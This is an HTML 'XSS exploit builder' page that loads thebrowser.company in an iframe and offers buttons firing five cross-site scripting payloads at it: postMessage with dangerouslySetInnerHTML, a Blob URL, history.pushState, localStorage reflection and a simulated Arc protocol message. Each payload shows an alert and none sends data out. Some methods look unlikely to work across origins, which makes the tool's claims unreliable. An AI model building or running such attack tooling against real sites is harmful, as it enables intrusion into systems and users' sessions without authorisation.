<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>💣 Universal XSS Exploit Builder</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 1rem; }
    iframe { width: 100%; height: 300px; border: 2px solid lime; margin-top: 1rem; }
    pre { background: #000; padding: 1rem; color: #ccc; }
    button { background: lime; color: black; font-weight: bold; padding: 0.5rem 1rem; margin: 5px; cursor: pointer; }
  </style>
</head>
<body>

<h2>💣 XSS Builder Against <code>thebrowser.company</code></h2>
<p>Choose your attack vector:</p>

<button onclick="sendPostMessage()">🚀 postMessage XSS</button>
<button onclick="injectBlob()">🧬 Blob URL Injection</button>
<button onclick="usePushState()">📜 history.pushState Injection</button>
<button onclick="reflectLocalStorage()">💾 localStorage Reflection</button>
<button onclick="arcProtocol()">🛰️ Arc Native Protocol Injection</button>

<iframe id="target" src="https://thebrowser.company"></iframe>

<pre id="log">🧪 Ready...</pre>

<script>
const iframe = document.getElementById("target");

function log(msg) {
  document.getElementById("log").textContent += "\n" + msg;
}

function sendPostMessage() {
  const payload = {
    props: {
      dangerouslySetInnerHTML: {
        __html: "<img src=x onerror='alert(\"🔥 postMessage XSS\")'>"
      }
    }
  };
  iframe.contentWindow.postMessage(payload, "*");
  log("🚀 Sent postMessage XSS payload");
}

function injectBlob() {
  const blob = new Blob(["<img src=x onerror='alert(\"🧬 Blob XSS\")'>"], {type: 'text/html'});
  const blobURL = URL.createObjectURL(blob);
  iframe.src = blobURL;
  log("🧬 Injected blob URL: " + blobURL);
}

function usePushState() {
  try {
    iframe.contentWindow.history.pushState({}, "", "/?data=<img src=x onerror='alert(\"📜 pushState XSS\")'>");
    log("📜 pushState payload injected in iframe");
  } catch (e) {
    log("❌ pushState blocked: " + e);
  }
}

function reflectLocalStorage() {
  try {
    iframe.contentWindow.localStorage.setItem("reflect", "<img src=x onerror='alert(\"💾 localStorage XSS\")'>");
    iframe.contentWindow.location.reload();
    log("💾 localStorage payload injected and reloaded iframe");
  } catch (e) {
    log("❌ localStorage blocked: " + e);
  }
}

function arcProtocol() {
  try {
    const payload = {
      props: {
        dangerouslySetInnerHTML: {
          __html: "<img src=x onerror='alert(\"🛰️ Arc Protocol XSS\")'>"
        }
      }
    };
    window.name = JSON.stringify(payload);
    iframe.contentWindow.postMessage(payload, "*");
    log("🛰️ Simulated Arc native postMessage injection via window.name");
  } catch (e) {
    log("❌ Arc protocol simulation failed: " + e);
  }
}
</script>

</body>
</html>
